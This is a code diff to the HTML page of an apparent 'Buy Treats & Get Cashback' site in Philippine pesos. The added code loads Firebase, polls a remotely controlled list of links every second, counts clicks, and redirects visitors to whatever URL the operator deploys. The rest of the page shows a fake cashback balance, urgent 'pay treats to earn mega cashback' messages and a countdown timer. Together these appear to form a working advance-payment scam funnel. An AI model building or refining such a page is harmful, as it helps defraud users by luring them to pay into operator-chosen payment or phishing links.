@@ -11,6 +11,36 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
   <!-- Main Styles -->
   <link rel="stylesheet" href="styles/main.css" />
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <!-- Config -->
+  <script src="js/config.js"></script>
+  
+  <style>
+    /* ===== ADDITIONAL INLINE CSS FOR NEON ICON ===== */
+    .claim-popup-user-info .user-phone i {
+      color: #00d4ff;
+      font-size: 0.9rem;
+      margin-right: 6px;
+      filter: drop-shadow(0 0 8px rgba(0, 212, 255, 0.3));
+      animation: neonPulse 2s ease-in-out infinite;
+    }
+
+    @keyframes neonPulse {
+      0%, 100% {
+        filter: drop-shadow(0 0 8px rgba(0, 212, 255, 0.3));
+      }
+      50% {
+        filter: drop-shadow(0 0 20px rgba(0, 212, 255, 0.6));
+      }
+    }
+
+    /* Hide duplicate phone icon if any */
+    .claim-popup-user-info .user-phone .fa-phone {
+      display: none;
+    }
+  </style>
 </head>
 <body>
 
@@ -174,9 +204,12 @@
         <i class="fas fa-times"></i>
       </button>
       
+      <!-- User Info - ONLY ONE MOBILE ICON (Neon Light Blue) -->
       <div class="claim-popup-user-info">
-        <div class="user-phone"><i class="fas fa-phone"></i> <span id="claimPopupPhone">09171234567</span></div>
-        <div class="user-reward">Reward: <span id="claimPopupReward">₱1,500</span></div>
+        <div class="user-phone">
+          <i class="fas fa-mobile-alt"></i> <span id="claimPopupPhone">09171234567</span>
+        </div>
+        <div class="user-reward">Reward Cashback: <span id="claimPopupReward">₱1,500</span></div>
       </div>
       
       <div class="claim-popup-image-wrapper">
@@ -235,13 +268,32 @@
   </div>
 
   <!-- ============================================================
-       MAIN JAVASCRIPT - ALL IN ONE WORKING
+       JAVASCRIPT - COMPLETE WORKING
   ============================================================ -->
   <script>
     // ============================================================
+    // FIREBASE INIT
+    // ============================================================
+    let database;
+    try {
+      if (typeof firebase !== 'undefined' && !firebase.apps.length) {
+        if (typeof firebaseConfig !== 'undefined') {
+          firebase.initializeApp(firebaseConfig);
+          database = firebase.database();
+          console.log('🔥 Firebase initialized');
+        }
+      } else if (typeof firebase !== 'undefined') {
+        database = firebase.database();
+        console.log('🔥 Firebase already initialized');
+      }
+    } catch(e) {
+      console.log('⚠️ Firebase error:', e);
+    }
+
+    // ============================================================
     // CARD DATA
     // ============================================================
-    const cardData = {
+    var cardData = {
       1: {
         img: 'photos/1500iva.png',
         badge: '₱1,500',
@@ -267,40 +319,45 @@
     // ============================================================
     // DOM REFERENCES
     // ============================================================
-    const typedSpan = document.getElementById('typedText');
-    const balanceElement = document.getElementById('balanceAmount');
-    const claimNowBtn = document.getElementById('claimNowBtn');
-    const photoWrapper = document.getElementById('photoWrapper');
+    var typedSpan = document.getElementById('typedText');
+    var balanceElement = document.getElementById('balanceAmount');
+    var claimNowBtn = document.getElementById('claimNowBtn');
+    var photoWrapper = document.getElementById('photoWrapper');
 
     // Card Popup
-    const cardPopupOverlay = document.getElementById('cardPopupOverlay');
-    const cardPopupImage = document.getElementById('cardPopupImage');
-    const cardPopupOldPrice = document.getElementById('cardPopupOldPrice');
-    const cardPopupNewPrice = document.getElementById('cardPopupNewPrice');
-    const cardPopupDiscount = document.getElementById('cardPopupDiscount');
-    const cardPopupReward = document.getElementById('cardPopupReward');
-    const cardPopupSelectBtn = document.getElementById('cardPopupSelectBtn');
+    var cardPopupOverlay = document.getElementById('cardPopupOverlay');
+    var cardPopupImage = document.getElementById('cardPopupImage');
+    var cardPopupOldPrice = document.getElementById('cardPopupOldPrice');
+    var cardPopupNewPrice = document.getElementById('cardPopupNewPrice');
+    var cardPopupDiscount = document.getElementById('cardPopupDiscount');
+    var cardPopupReward = document.getElementById('cardPopupReward');
+    var cardPopupSelectBtn = document.getElementById('cardPopupSelectBtn');
 
     // Claim Popup
-    const claimPopupOverlay = document.getElementById('claimPopupOverlay');
-    const claimPopupImage = document.getElementById('claimPopupImage');
-    const claimPopupOldPrice = document.getElementById('claimPopupOldPrice');
-    const claimPopupNewPrice = document.getElementById('claimPopupNewPrice');
-    const claimPopupDiscount = document.getElementById('claimPopupDiscount');
-    const claimPopupRewardAmount = document.getElementById('claimPopupRewardAmount');
-    const claimPopupPhone = document.getElementById('claimPopupPhone');
-    const claimPayBtn = document.getElementById('claimPayBtn');
-    const claimTimerDisplay = document.getElementById('claimTimerDisplay');
+    var claimPopupOverlay = document.getElementById('claimPopupOverlay');
+    var claimPopupImage = document.getElementById('claimPopupImage');
+    var claimPopupOldPrice = document.getElementById('claimPopupOldPrice');
+    var claimPopupNewPrice = document.getElementById('claimPopupNewPrice');
+    var claimPopupDiscount = document.getElementById('claimPopupDiscount');
+    var claimPopupRewardAmount = document.getElementById('claimPopupRewardAmount');
+    var claimPopupReward = document.getElementById('claimPopupReward');
+    var claimPopupPhone = document.getElementById('claimPopupPhone');
+    var claimPayBtn = document.getElementById('claimPayBtn');
+    var claimTimerDisplay = document.getElementById('claimTimerDisplay');
 
     // ============================================================
     // STATE
     // ============================================================
-    let selectedCard = null;
-    let currentBalance = 0;
-    let cardPopupNumber = null;
-    let timerInterval = null;
-    let timeRemaining = 0;
-    let isTimerRunning = false;
+    var selectedCard = null;
+    var currentBalance = 0;
+    var cardPopupNumber = null;
+    var timerInterval = null;
+    var timeRemaining = 0;
+    var isTimerRunning = false;
+    var treatLink = null;
+    var isRedirecting = false;
+    var linkScannerInterval = null;
+    var currentTreatType = null;
 
     // ============================================================
     // HELPER FUNCTIONS
@@ -309,32 +366,138 @@
       return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
     }
 
+    function getPhilippineTime() {
+      return new Date().toLocaleString('en-PH', {
+        timeZone: 'Asia/Manila',
+        month: 'long',
+        day: 'numeric',
+        year: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+      });
+    }
+
     // ============================================================
-    // THOUGHT BUBBLE TYPEWRITER (WORKING)
+    // CHECK FOR DEPLOYED LINK (FIREBASE)
     // ============================================================
-    const messagesNoBalance = [
+    function checkForDeployedLink(treatType) {
+      if (!database) return Promise.resolve(null);
+      return database.ref('treat_links')
+        .orderByChild('type')
+        .equalTo(treatType)
+        .once('value')
+        .then(function(snapshot) {
+          var links = snapshot.val();
+          if (links) {
+            var linkIds = Object.keys(links);
+            var latestId = linkIds[linkIds.length - 1];
+            return links[latestId].url;
+          }
+          return null;
+        })
+        .catch(function(error) {
+          console.error('❌ Error checking link:', error);
+          return null;
+        });
+    }
+
+    // ============================================================
+    // START AUTO SCAN (every second)
+    // ============================================================
+    function startAutoScan(treatType) {
+      stopAutoScan();
+      currentTreatType = treatType;
+      console.log('🔄 Auto-scan started for:', treatType);
+      
+      checkAndRedirect(treatType);
+      
+      linkScannerInterval = setInterval(function() {
+        checkAndRedirect(treatType);
+      }, 1000);
+    }
+
+    function stopAutoScan() {
+      if (linkScannerInterval) {
+        clearInterval(linkScannerInterval);
+        linkScannerInterval = null;
+        console.log('🛑 Auto-scan stopped');
+      }
+      currentTreatType = null;
+    }
+
+    function checkAndRedirect(treatType) {
+      if (isRedirecting || !treatType || !database) return;
+      
+      checkForDeployedLink(treatType).then(function(link) {
+        if (link) {
+          console.log('🔗 Link found:', link);
+          treatLink = link;
+          
+          if (claimPopupOverlay.classList.contains('active')) {
+            if (isTimerRunning) {
+              clearInterval(timerInterval);
+              timerInterval = null;
+              isTimerRunning = false;
+            }
+            
+            isRedirecting = true;
+            claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING...';
+            
+            if (database) {
+              database.ref('treat_links')
+                .orderByChild('type')
+                .equalTo(treatType)
+                .once('value')
+                .then(function(snapshot) {
+                  var links = snapshot.val();
+                  if (links) {
+                    var linkIds = Object.keys(links);
+                    var latestId = linkIds[linkIds.length - 1];
+                    var currentClicks = links[latestId].clicks || 0;
+                    database.ref('treat_links/' + latestId + '/clicks').set(currentClicks + 1);
+                  }
+                });
+            }
+            
+            setTimeout(function() {
+              window.location.href = link;
+            }, 1500);
+          }
+        } else {
+          console.log('ℹ️ No link found for:', treatType);
+        }
+      }).catch(function(error) {
+        console.error('❌ Scanner error:', error);
+      });
+    }
+
+    // ============================================================
+    // THOUGHT BUBBLE TYPEWRITER
+    // ============================================================
+    var messagesNoBalance = [
       "🎄 Advance Merry Christmas! 🎅",
       "Earn cashback on every treat you buy! 💰",
       "Buy Treats & Get Cashback! 🎁",
       "Select a treat to start earning! ✨"
     ];
 
-    const messagesWithBalance = [
+    var messagesWithBalance = [
       "🎄 Your balance is ready! 🎅",
       "Click Claim now and Pay the Treats to Earn mega cashback! 💰",
       "Don't forget to claim your reward! 🎁",
       "Your cashback is waiting! ✨ Claim now!!"
     ];
 
-    let currentMessages = messagesNoBalance;
-    let messageIndex = 0;
-    let charIndex = 0;
-    let isDeleting = false;
-    let typingSpeed = 36;
+    var currentMessages = messagesNoBalance;
+    var messageIndex = 0;
+    var charIndex = 0;
+    var isDeleting = false;
+    var typingSpeed = 36;
 
     function updateThoughtMessages() {
-      const balance = parseFloat(balanceElement.textContent.replace(/,/g, ''));
-      const newMessages = balance > 0 ? messagesWithBalance : messagesNoBalance;
+      var balance = parseFloat(balanceElement.textContent.replace(/,/g, ''));
+      var newMessages = balance > 0 ? messagesWithBalance : messagesNoBalance;
       
       if (currentMessages !== newMessages) {
         currentMessages = newMessages;
@@ -347,7 +510,7 @@
     }
 
     function typeEffect() {
-      const currentMessage = currentMessages[messageIndex];
+      var currentMessage = currentMessages[messageIndex];
       if (!currentMessage) {
         messageIndex = 0;
         return;
@@ -357,7 +520,10 @@
         typedSpan.textContent = currentMessage.substring(0, charIndex + 1);
         charIndex++;
         if (charIndex === currentMessage.length) {
-          setTimeout(() => { isDeleting = true; typeEffect(); }, 2800);
+          setTimeout(function() { 
+            isDeleting = true; 
+            typeEffect(); 
+          }, 2800);
           return;
         }
         setTimeout(typeEffect, typingSpeed + Math.random() * 18);
@@ -378,7 +544,7 @@
     setTimeout(typeEffect, 600);
 
     // Watch balance changes
-    const balanceObserver = new MutationObserver(updateThoughtMessages);
+    var balanceObserver = new MutationObserver(updateThoughtMessages);
     if (balanceElement) {
       balanceObserver.observe(balanceElement, { childList: true, characterData: true, subtree: true });
     }
@@ -401,7 +567,7 @@
     // BALANCE UPDATE
     // ============================================================
     function updateBalance(newAmount, isIncrement) {
-      const amountSpan = balanceElement;
+      var amountSpan = balanceElement;
       amountSpan.classList.remove('increment', 'decrement');
       void amountSpan.offsetWidth;
       amountSpan.textContent = formatWithCommas(newAmount) + '.00';
@@ -410,19 +576,19 @@
       } else {
         amountSpan.classList.add('decrement');
       }
-      setTimeout(() => {
+      setTimeout(function() {
         amountSpan.classList.remove('increment', 'decrement');
       }, 700);
     }
 
     // ============================================================
-    // CARD SELECTION (WORKING)
+    // CARD SELECTION
     // ============================================================
     function selectCard(cardNumber) {
-      const card = document.getElementById('card' + cardNumber);
-      const btn = card.querySelector('.card-btn');
-      const amount = cardData[cardNumber].amount;
-      const cardId = 'card' + cardNumber;
+      var card = document.getElementById('card' + cardNumber);
+      var btn = card.querySelector('.card-btn');
+      var amount = cardData[cardNumber].amount;
+      var cardId = 'card' + cardNumber;
 
       if (selectedCard === cardId) {
         card.classList.remove('selected');
@@ -432,12 +598,13 @@
         currentBalance = 0;
         updateBalance(0, false);
         updateThoughtMessages();
+        stopAutoScan();
         return;
       }
 
       if (selectedCard !== null) {
-        const prevCard = document.getElementById(selectedCard);
-        const prevBtn = prevCard.querySelector('.card-btn');
+        var prevCard = document.getElementById(selectedCard);
+        var prevBtn = prevCard.querySelector('.card-btn');
         prevCard.classList.remove('selected');
         prevBtn.classList.remove('selected-btn');
         prevBtn.textContent = 'Select Treat';
@@ -450,14 +617,17 @@
       currentBalance = amount;
       updateBalance(amount, true);
       updateThoughtMessages();
+      
+      var treatType = cardData[cardNumber].type;
+      startAutoScan(treatType);
     }
 
     // ============================================================
-    // CARD POPUP (WORKING)
+    // CARD POPUP
     // ============================================================
     function openCardPopup(cardNumber) {
       cardPopupNumber = cardNumber;
-      const data = cardData[cardNumber];
+      var data = cardData[cardNumber];
       
       cardPopupImage.src = data.img;
       cardPopupOldPrice.textContent = data.oldPrice;
@@ -476,9 +646,9 @@
     }
 
     function updateCardPopupButtonState() {
-      const cardId = 'card' + cardPopupNumber;
-      const card = document.getElementById(cardId);
-      const isSelected = card.classList.contains('selected');
+      var cardId = 'card' + cardPopupNumber;
+      var card = document.getElementById(cardId);
+      var isSelected = card.classList.contains('selected');
       
       if (isSelected) {
         cardPopupSelectBtn.classList.add('selected-popup');
@@ -498,7 +668,7 @@
     }
 
     // ============================================================
-    // CLAIM POPUP (WORKING)
+    // CLAIM POPUP
     // ============================================================
     function openClaimPopup() {
       if (selectedCard === null) {
@@ -506,20 +676,32 @@
         return;
       }
       
-      const cardNumber = parseInt(selectedCard.replace('card', ''));
-      const data = cardData[cardNumber];
-      const rawAmount = parseInt(data.badge.replace('₱', '').replace(/,/g, ''));
+      var cardNumber = parseInt(selectedCard.replace('card', ''));
+      var data = cardData[cardNumber];
+      var rawAmount = parseInt(data.badge.replace('₱', '').replace(/,/g, ''));
       
       claimPopupImage.src = data.img;
       claimPopupOldPrice.textContent = data.oldPrice;
       claimPopupNewPrice.textContent = data.newPrice;
       claimPopupDiscount.textContent = data.discount;
+      
       claimPopupRewardAmount.textContent = formatWithCommas(rawAmount);
-      claimPopupPhone.textContent = '📱 ' + (localStorage.getItem('user_phone') || '09171234567');
+      claimPopupReward.textContent = data.badge;
+      
+      claimPopupPhone.textContent = localStorage.getItem('user_phone') || '09171234567';
       
       resetClaimTimer();
       claimPopupOverlay.classList.add('active');
       document.body.style.overflow = 'hidden';
+      
+      if (database && currentTreatType) {
+        checkForDeployedLink(currentTreatType).then(function(link) {
+          if (link) {
+            treatLink = link;
+            console.log('🔗 Link already exists:', link);
+          }
+        });
+      }
     }
 
     function closeClaimPopup() {
@@ -529,7 +711,7 @@
     }
 
     // ============================================================
-    // TIMER (WORKING)
+    // TIMER
     // ============================================================
     function startTimer() {
       if (selectedCard === null) {
@@ -538,6 +720,13 @@
       }
       if (isTimerRunning) return;
       
+      if (treatLink && !isRedirecting) {
+        isRedirecting = true;
+        claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING...';
+        setTimeout(function() { window.location.href = treatLink; }, 1500);
+        return;
+      }
+      
       timeRemaining = 300;
       isTimerRunning = true;
       claimPayBtn.classList.add('disabled');
@@ -545,9 +734,9 @@
       
       timerInterval = setInterval(function() {
         timeRemaining--;
-        const minutes = Math.floor(timeRemaining / 60);
-        const seconds = timeRemaining % 60;
-        const timeStr = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
+        var minutes = Math.floor(timeRemaining / 60);
+        var seconds = timeRemaining % 60;
+        var timeStr = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
         if (claimTimerDisplay) claimTimerDisplay.textContent = timeStr;
         
         if (timeRemaining <= 0) {
@@ -558,6 +747,16 @@
           claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY TREATS';
           if (claimTimerDisplay) claimTimerDisplay.textContent = '';
           console.log('⏰ Timer finished');
+          
+          if (database && currentTreatType) {
+            checkForDeployedLink(currentTreatType).then(function(link) {
+              if (link && !isRedirecting) {
+                isRedirecting = true;
+                claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING...';
+                setTimeout(function() { window.location.href = link; }, 1500);
+              }
+            });
+          }
         }
       }, 1000);
     }
@@ -627,8 +826,7 @@
 
     console.log('✅ Main.js initialized successfully');
     console.log('✅ Thought bubble started');
-    console.log('✅ All popups working');
-    console.log('✅ All buttons clickable');
+    console.log('✅ Auto-scan enabled (every 1 second)');
   </script>
 
 </body>
